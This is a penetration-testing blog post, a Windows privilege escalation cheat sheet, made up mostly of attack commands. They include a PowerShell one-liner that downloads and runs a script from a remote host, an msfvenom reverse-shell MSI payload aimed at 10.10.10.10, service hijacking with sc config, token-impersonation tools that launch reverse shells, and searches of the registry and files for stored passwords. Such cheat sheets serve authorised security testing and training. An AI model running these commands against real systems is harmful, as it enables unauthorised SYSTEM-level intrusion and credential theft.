                    <h1 class="blog-title">Windows Privilege Escalation Cheatsheet</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>May 15, 2026</span>
                        <span>18 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="priv-intro">
                        You're sitting on a low-priv shell and the client wants to see SYSTEM. Here's every dirty trick, misconfiguration, and lazy admin decision that'll get you there — organized by how likely you are to find it in the wild.
                    </p>

                    <h2 id="priv-kernel">Kernel Exploits</h2>
                    <p>
                        Always check the OS version and patch level first. If the box is unpatched, you might not even need to work for it.
                    </p>
                    <pre><code># Check Windows version and build
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# List installed hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Common kernel exploits by version:
# Windows 7 / Server 2008 R2  →  MS16-032, MS15-051, MS14-058
# Windows 8.1 / Server 2012  →  MS16-032, MS15-051
# Windows 10 (pre-1809)      →  CVE-2019-0841, CVE-2020-0787
# Windows 10 / Server 2016+  →  CVE-2021-36934 (HiveNightmare)</code></pre>

                    <h2 id="priv-services">Service Misconfigurations</h2>
                    <p>
                        Windows services run as SYSTEM by default. If you can modify one, you own the box. It's that simple.
                    </p>

                    <h3 id="priv-unquoted">Unquoted Service Paths</h3>
                    <p>
                        When a service path contains spaces and isn't wrapped in quotes, Windows tries to execute at every space boundary. If you can write to any of those paths, you win.
                    </p>
                    <pre><code># Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Or use PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1'); Invoke-AllChecks"

# If you find one, drop your payload:
# C:\Program Files\Vulnerable Service\service.exe
# Try writing to: C:\Program.exe, C:\Program Files\Vulnerable.exe, etc.</code></pre>

                    <h3 id="priv-weak-perms">Weak Service Permissions</h3>
                    <p>
                        Sometimes the service binary itself is locked down, but the service configuration isn't. If you have <code>SERVICE_CHANGE_CONFIG</code> or <code>SERVICE_ALL_ACCESS</code>, just point the service at your payload.
                    </p>
                    <pre><code># Check service permissions with accesschk
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *

# If you can modify a service:
sc config "VulnService" binpath= "C:\temp\revshell.exe"
sc start "VulnService"</code></pre>

                    <h2 id="priv-registry">Registry Exploits</h2>
                    <p>
                        The registry is where Windows hides its skeletons. Autoruns, AlwaysInstallElevated, and stored credentials all live here.
                    </p>
                    <pre><code># Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are set to 1, generate an MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o payload.msi
msiexec /quiet /qn /i payload.msi

# Check for autorun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check for stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"</code></pre>

                    <h2 id="priv-scheduled">Scheduled Tasks</h2>
                    <p>
                        Scheduled tasks often run as SYSTEM and point to scripts or binaries that regular users can modify. Check them all.
                    </p>
                    <pre><code># List scheduled tasks
schtasks /query /fo LIST /v | findstr "Task To Run:"

# Check permissions on task binaries
icacls "C:\Path\To\TaskBinary.exe"

# If writable, replace with payload and wait (or trigger manually)</code></pre>

                    <h2 id="priv-token">Token Impersonation</h2>
                    <p>
                        If you have <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>, you can impersonate SYSTEM tokens. JuicyPotato, RoguePotato, PrintSpoofer — pick your poison.
                    </p>
                    <pre><code># Check your privileges
whoami /priv

# If SeImpersonatePrivilege is enabled:
# JuicyPotato (Windows 7/8/Server 2012/2016)
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\temp\revshell.exe" -l 1337

# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer.exe -c "C:\temp\revshell.exe"

# RoguePotato (when JuicyPotato fails)
RoguePotato.exe -r 10.10.10.10 -e "C:\temp\revshell.exe" -l 9999</code></pre>

                    <h2 id="priv-checklist">Quick Checklist</h2>
                    <ul>
                        <li><code>systeminfo</code> — OS version, patches, architecture</li>
                        <li><code>whoami /priv</code> — token privileges (SeImpersonate?)</li>
                        <li><code>whoami /groups</code> — group memberships</li>
                        <li><code>net user</code> — local users</li>
                        <li><code>tasklist /svc</code> — running services</li>
                        <li><code>sc query</code> — all services</li>
                        <li><code>wmic service get pathname</code> — service paths</li>
                        <li><code>icacls</code> — permissions on interesting paths</li>
                        <li><code>reg query</code> — registry keys for creds, autoruns, AlwaysInstallElevated</li>
                        <li><code>schtasks</code> — scheduled tasks</li>
                        <li><code>dir /s *pass*</code> — files with "pass" in the name</li>
                        <li><code>findstr /si password *.txt *.ini *.xml *.config</code> — plaintext passwords</li>
                        <li>Run <code>winPEAS.exe</code> or <code>PowerUp</code> if nothing obvious stands out</li>
                    </ul>

                    <blockquote>
                        "If you can't find a privesc vector, you're not looking hard enough. Windows is basically a collection of design decisions that someone will eventually regret."
                    </blockquote>
                </div>

